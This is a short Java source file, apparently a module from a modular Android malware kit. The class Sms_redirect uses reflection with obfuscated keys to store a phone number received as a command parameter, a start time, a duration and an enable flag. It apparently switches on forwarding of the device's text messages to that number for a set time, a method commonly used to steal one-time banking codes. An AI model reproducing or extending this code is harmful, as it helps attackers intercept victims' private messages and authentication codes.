package com.moonny.mods_src;

import org.json.JSONObject;
import java.lang.reflect.Method;
import java.util.HashMap;

public class Sms_redirect {

    public int MAIN_VER_REQUIRED = 100; // minimum Main api version required
    private Object mods;
    private Method run_func;

    public Sms_redirect(HashMap<String, Object> system) throws Exception
    {
        this.mods = system.get("a4");
        this.run_func = mods.getClass().getDeclaredMethod((String) system.get("a5"), String.class, String.class, Object[].class);
    }

    public JSONObject run(JSONObject params) throws Exception {

        String number = params.getString("n");
        String time_minutes = params.getString("d");
        run_func.invoke(mods, "main", "set_pref", new Object[]{"p8", number});

        long workTimeLong;
        try {
            workTimeLong = Integer.parseInt(time_minutes) * 60000;
        }catch (Exception e) {
            workTimeLong = 60 * 60000; // default delay
        }

        long currentTime = System.currentTimeMillis();

        run_func.invoke(mods, "main", "set_pref", new Object[]{"p9", currentTime});
        run_func.invoke(mods, "main", "set_pref", new Object[]{"p10", workTimeLong});
        run_func.invoke(mods, "main", "set_pref", new Object[]{"p11", true});

        return null;
    }

}
